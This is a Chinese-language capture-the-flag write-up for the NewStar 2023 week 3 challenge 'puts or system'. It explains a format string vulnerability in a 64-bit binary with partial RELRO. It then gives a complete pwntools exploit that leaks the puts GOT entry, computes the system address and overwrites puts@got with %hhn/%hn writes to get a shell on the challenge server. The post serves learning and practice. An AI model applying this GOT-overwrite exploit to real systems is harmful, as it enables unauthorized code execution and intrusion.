---
title: newstar2023 week3 - puts or system
date: 2023/10/12 12:00:00
updated: 2024/7/30 10:28:00
tags:
    - noob
excerpt: 通过格式化字符串漏洞，将程序中的puts调用替换为system调用，成功获取shell。
---

## 文件分析

下载`putsorsys`, NX on, PIE off, Canary on, RELRO partial  
ghidra分析为64位程序

## 解题思路

程序可多次输入，且存在格式化字符串漏洞；在printf后，执行了`puts("/bin/sh")`  
根据题意，将puts调用替换为system调用就可以拿到shell

由于程序relro保护为partial，因此可以直接将`puts@got`地址改为system地址即可

{% note tip fa-arrow-right %}
%n系列写地址输出过的字符是**累计的**，所以计算失误就会导致攻击失败，
因此可以把小的数字放在前面，大的数字放在后面，方便计算
{% endnote %}

## EXPLOIT

```python
from pwn import *
elf = ELF('putsorsys')
sh = remote('node4.buuoj.cn', 29595)
putsGot = elf.got['puts']

# payload 1
sh.sendline(b'1')
sh.sendlineafter(b'it', b'%9$sxxxx' + p64(putsGot)) # get puts@got

sh.recvuntil(b':\n')
putsGotAddr = u64(sh.recvline()[:6] + b'\0\0')
#addr = putsGotAddr - 0x179bf0 + 0x14f760
addr = putsGotAddr - 0x180ed0 + 0x150d60 # libc given, shift puts to system
print(hex(addr))

# payload 2
sh.sendline(b'1')
highAddr = (addr & 0xff0000) >> 16
sh.sendlineafter(b'it', f'%{highAddr}c%11$hhn%{(addr & 0xffff) - highAddr}c%12$hn'.ljust(24, '0').encode() + p64(putsGot + 2) + p64(putsGot))

sh.interactive()
```

## 第一次三血！

<img src="/assets/newstar2023/3rdBlood.jpg" width="40%" title="好耶">

Done.
